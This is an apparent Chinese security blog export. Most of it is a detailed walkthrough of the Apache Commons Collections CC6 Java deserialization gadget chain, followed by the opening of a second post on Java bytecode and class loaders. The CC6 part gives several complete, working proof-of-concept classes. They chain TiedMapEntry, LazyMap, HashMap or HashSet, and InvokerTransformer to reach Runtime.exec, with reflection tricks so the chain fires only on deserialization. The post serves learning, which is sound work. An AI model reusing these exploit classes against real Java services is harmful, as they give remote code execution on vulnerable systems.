<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且map是可控的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="hashmap（方法一）"><a href="#hashmap（方法一）" class="headerlink" title="hashmap（方法一）"></a>hashmap（方法一）</h3><p>然后我们可以在hashcode中找到对getvalue的调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">    Object value = getValue();</span><br><span class="line">    return (getKey() == null ? 0 : getKey().hashCode()) ^</span><br><span class="line">           (value == null ? 0 : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那我们可以继续构造我们的POC:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">         HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里我们通过hashcode可以触发getvalue进行触发get方法</p>
<p>那么我们后面就是继续找哪里调用了hashcode</p>
<p>关于hashcode我们在urldns中是通过hashmap反序列化时候其<code>readObject()</code>函数会循环每一个键值对放入到HashMap中，而在放入每一个键值对的时候会计算hash（key）值，从而触发<code>key.hashCode()</code>方法，我们在cc6同样可以继续使用这个利用链,进而触发我们后面的漏洞方法：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">          <span class="comment">///******中间代码省略</span></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在反序列化时会遍历每一个键值对，将其放入到hashmap中，但是这个过程每次都会调用到hash(key)方法，我们跟进到hash方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726151141806.png"
                      alt="image-20230726151141806"
                ></p>
<p>hash方法会对传进来的key值进行判断是否为空，我们只许让key值不为空我们就能触发到hashcode方法</p>
<p>然后我们这里可以看到触发hashcode的时key值</p>
<p>那么我们只需要让传进来的key值为我们前面构造的TiedMapEntry对象就可以触发到TiedMapEntry类里面的hashcode方法，那我们整条链子就可以连起来了。</p>
<p>那么根据我们上面的分析我们可以构造出来我们的利用链POC：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;ccz&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;cc&quot;</span>);</span><br><span class="line">        &#125;    </span><br></pre></td></tr></table></figure></div>

<p>但是现在出现了一个问题，我们现在这里并没有进行反序列化但是这条链子就已经会弹出来计算器了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726152001706.png"
                      alt="image-20230726152001706"
                ></p>
<p>出现的这个问题的原因和我们在分析urldns时触发了两次dns解析的原因是一样的：</p>
<p>我们在使用hash.put输入键值对时就会触发一次hash方法，我们这里可以跟进put方法看一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726152332245.png"
                      alt="image-20230726152332245"
                ></p>
<p>在我们调用put方法的时候也会调用hash方法进而触发了我们后面的利用链：</p>
<p>当然解决这个问题的方法也很简单：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br></pre></td></tr></table></figure></div>

<p>我们只用将这里的我们构造的chainTransformer对象先替换掉，让利用链到Lazymap的get方法时先断开，避免在使用put方法时触发利用链。</p>
<p>修改POC：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;ccz&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;cc&quot;</span>);</span><br><span class="line">        &#125;    </span><br></pre></td></tr></table></figure></div>

<p>我们这里使用的还是这个ConstantTransformer方法，这个方法我们在cc1解决setvlaue值不可控的时候用过，我们通过这个方法使得无论接收什么，都会将我们构造的虚拟机对象返回。</p>
<p>我们这里同样使用这个方法，当然这个地方其他方法也可以，我们最终的目的只是让利用链断开，无法执行到我们后面的transform方法。</p>
<p>但是我们后期还是要执行这个利用链，所以我们后面在执行完hashmap.put之后要将我们构造的chainTransformer对象重新传进去，使整个利用链能够到transform方法执行命令。</p>
<p>我们这里可以通过反射机制通过获取和设置类的私有字段来修改<code>LazyMap</code>对象的<code>factory</code>字段，为我们构造的chainTransformer对象即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c = LazyMap.class;</span><br><span class="line">Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">factory.setAccessible(true);</span><br><span class="line">factory.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure></div>

<p>那么整体的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ccz&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;cc&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是我们这里运行之后发现并没有执行我们调用计算器程序的命令。</p>
<p>我们在<code>hashMap.put(tiedMapEntry,&quot;cc&quot;);</code>打上断点进行调试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726154314171.png"
                      alt="image-20230726154314171"
                ></p>
<p>步入，跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726154503873.png"
                      alt="image-20230726154503873"
                ></p>
<p>当我们跟进到LazyMap的get方法时可以看到这里：</p>
<p>这里的containsKey(key)会检测key是否存在map中，这里的map也就是我们上面定义的hashmap对象map</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br></pre></td></tr></table></figure></div>

<p>然后这里我们上面是没有往里面放任何数据的所以这里会返回false</p>
<p>进而触发了第一次</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">factory.transform(key);</span><br></pre></td></tr></table></figure></div>

<p>但是这里的<code>map.put(key, value);</code>会将key值添加到map中</p>
<p>那么现在就出现一个个问题在我们进行反序列化时利用链走到这个if判断时，由于map中存在这个key值，导致<code>map.containsKey(key)</code>返回值为true，导致无法触发到<code>factory.transform(key);</code>方法，进而无法执行到后面的利用链进行命令执行。</p>
<p>这也就是我们刚才反序列化为什么不能够执行调用计算器程序命令的原因，我们的利用链走到这个get方法就断掉了，导致后续利用无法进行。</p>
<p>那么解决这个问题的方法也很简单，既然存在了这个key值，导致<code>map.containsKey(key)</code>返回值为true，那我们这里把这个key值删掉就行了，使其返回值为false进行触发到<code>factory.transform(key);</code></p>
<p>我们这里直接使用remove就可以删除了。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lazyMap.remove(&quot;ceshi&quot;);</span><br></pre></td></tr></table></figure></div>

<h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><p>那么根据我们上面的分析我们可以构造出最终的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;cc&quot;);</span><br><span class="line">        lazyMap.remove(&quot;ceshi&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行看一下结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726162609492.png"
                      alt="image-20230726162609492"
                ></p>
<p>触发成功。</p>
<h3 id="hashSet（方法二）"><a href="#hashSet（方法二）" class="headerlink" title="hashSet（方法二）"></a>hashSet（方法二）</h3><p>在上面我们我们分析了，hashmap的put方法在调用时也会调用hashcode方法进而调用后续执行链，我们在前面是通过修改传入的chainTransform对象，使执行链断开，使在调用put方法时无法执行后续执行链。</p>
<p>那我们是否可以利用这个put方法，将其纳入到利用链里面。</p>
<p>我们这里可以找一下put方法的调用：</p>
<p>我们发现<code>HashSet.readObject()</code>中call 到了put()方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">////*/**********中间代码省略</span><br><span class="line"></span><br><span class="line">        // Read in all elements in the proper order.</span><br><span class="line">        for (int i=0; i&lt;size; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们只需要让或者map的值是我们的hashmap对象就行了，我们就可以通过这个hashSet调用后续执行链。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726165235137.png"
                      alt="image-20230726165235137"
                ></p>
<p>可以看到这个readObject中会自动创建一个map，然后这里会判断始HashSet对象是不是LinkedHashSet的实例，是的话会创建一个一个新的<code>LinkedHashMap</code>对象，不是的话就会创造一个hashmap对象。</p>
<p>那我们只用改变生成的hashmap对象的key值为我们要传入的TiedMapEntry对象，后面再调用map.put的时候就可以触发后续执行链。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(e, PRESENT);</span><br></pre></td></tr></table></figure></div>

<p>所以我们就是要让这里的e变成我们创建的TiedMapEntry对象。</p>
<p>那我们这里可以看一下<code>HashSet.writeObject</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726165940060.png"
                      alt="image-20230726165940060"
                ></p>
<p>这里的e就是map中的key值，复制给e然后进行序列化，那么也就是说如果我们变量map中存在值，这里就会将其序列化，那么我们只要将我们构造的TiedMapEntry对象传入到这个map中，再反序列化调用put时就可以触发后续利用链。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726170902125.png"
                      alt="image-20230726170902125"
                ></p>
<p>再hashSet方法中会向map中添加一个key</p>
<p>那我们这里直接通过add方法将我们的TiedMapEntry对象传入进去，进而触发后续利用链。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet hashSet=new HashSet();</span><br><span class="line">hashSet.add(tiedMapEntry);</span><br></pre></td></tr></table></figure></div>

<h3 id="最终POC："><a href="#最终POC：" class="headerlink" title="最终POC："></a>最终POC：</h3><p>那么根据上面的分析我们的poc就可以修改为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">        HashSet hashSet=new HashSet();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        lazyMap.remove(&quot;test1&quot;);</span><br><span class="line">        lazyMap.remove(&quot;ceshi&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行测试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726171407225.png"
                      alt="image-20230726171407225"
                ></p>
<p>触发成功。</p>
<p>利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet.readObject</span><br><span class="line">HashMap.put</span><br><span class="line">HashMap.hash</span><br><span class="line">TiedMapEntry.hashCode</span><br><span class="line">TiedMapEntry.getValue</span><br><span class="line">LazyMap.get</span><br><span class="line">ChainedTransformer.transform</span><br><span class="line">InvokerTransformer.transform</span><br><span class="line">Runtime.exec</span><br></pre></td></tr></table></figure></div>



<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>cc6利用链流程图</p>
<p><strong><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726172720852.png"
                      alt="image-20230726172720852"
                ></strong></p>
<p>结合urldns和cc1的一个整体流程图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726173711097.png"
                      alt="image-20230726173711097"
                ></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java动态加载字节码</title>
    <url>/2023/07/31/java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面分析CC1和CC6利用链的时候，都是通过transform直接执行命令，但是在cc3中是通过动态类加载字节码来实现自动执行恶意类的代码。然后这里在对cc3利用链分析前，先对java动态加载字节码进行一个学习。</p>
<h1 id="二、java字节码"><a href="#二、java字节码" class="headerlink" title="二、java字节码"></a>二、java字节码</h1><p>java字节码是java程序源代码经过编译器(javac)编译生成的中间代码，严格来说，它并不是本地机器代码，而是一种与平台无关的低级指令集。这些指令由java虚拟机（JVM）解释执行，使得java程序可以一次编写，随处执行。使得上层开发者只需将自己的代码编译一次，就可以运行在不同平台的JVM虚拟机中。</p>
<p>我们写的java(.java)程序通过编译器编译成的就是字节码文件(.class)。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class helloworld &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;hello,world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过编译器进行编译：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac 文件名.java</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731140856122.png"
                      alt="image-20230731140856122"
                ></p>
<p>我们这里通过010打开编译器生成的class文件就可以看到生成的字节码了。</p>
<p>可以看到在我们生成的字节码中包含了常量，访问标志，类信息，字段信息，方法信息，方法代码，以及字节码指令等等这些内容共同构成了java字节码结构，java虚拟机在运行时通过解释这些字节码指令来执行java程序。</p>
<p>具体的关于字节码的每一块的解释可以看看这篇文章:</p>
<p><a class="link"   href="https://www.jianshu.com/p/fa53b4169df9" >https://www.jianshu.com/p/fa53b4169df9 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下图引自P神java安全漫谈</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731142609856.png"
                      alt="image-20230731142609856"
                ></p>
<h1 id="三、ClassLoader（类加载器）"><a href="#三、ClassLoader（类加载器）" class="headerlink" title="三、ClassLoader（类加载器）"></a>三、ClassLoader（类加载器）</h1><p>在上面我们说可以java虚拟机通过解释字节码来执行java程序</p>
<p>但是我们想要通过解释器去解释字节码执行java程序要先将字节码加载到内存中,那么在java虚拟机中将字节码加载到内存中就是通过类加载器。这个JVM的重要组件来实现的。当classloader将字节码加载到内存中，会创建相应的Class对象，然后解释器逐条解释执行这些字节码指令，然后执行对应的操作，并根据指令的结果继续执行下一条指令。解释器的作用是将字节码翻译成实际的操作，实现了 Java 代码在不同平台上的执行。</p>
